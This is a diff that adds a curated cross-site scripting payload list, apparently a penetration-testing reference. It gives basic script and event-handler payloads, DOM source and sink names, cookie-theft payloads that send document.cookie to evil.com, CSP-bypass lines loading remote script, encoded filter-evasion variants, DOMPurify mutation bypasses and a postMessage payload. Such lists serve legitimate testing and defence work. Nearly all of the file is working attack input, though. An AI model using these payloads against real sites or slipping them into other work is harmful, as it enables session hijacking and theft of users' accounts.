@@ -1,0 +1,52 @@
+# XSS Payloads - Curated from exploit-cookbook + security-arsenal
+# Source: security-arsenal-argus.md + articles-xss-vectors-playbook.md
+
+# Basic detection
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+
+# DOM XSS sources and sinks
+# Sources: document.URL, document.documentURI, document.referrer, location.search, location.hash, window.name
+# Sinks: eval(), setTimeout(), setInterval(), document.write(), innerHTML, outerHTML, document.location
+
+# Cookie theft
+<script>new Image().src="http://evil.com/?c="+document.cookie</script>
+<script>fetch('http://evil.com/?c='+document.cookie)</script>
+<script>x=new XMLHttpRequest();x.open("GET","http://evil.com/?c="+document.cookie);x.send()</script>
+<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">
+
+# CSP bypass
+<script src=//evil.com/script.js></script>
+<link rel=import href="http://evil.com/polymer.html">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<link rel=dns-prefetch href="//evil.com">
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<Script>alert(1)</Script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<svg><script>&#97;lert(1)</script>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+
+# Mutation XSS (DOMPurify bypass)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<svg><style>&#60;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style>
+<math><mi//><img src=x onerror=alert(1)>
+
+# postMessage XSS
+<iframe src="target.com" onload="this.contentWindow.postMessage('<script>alert(1)</script>','*')">
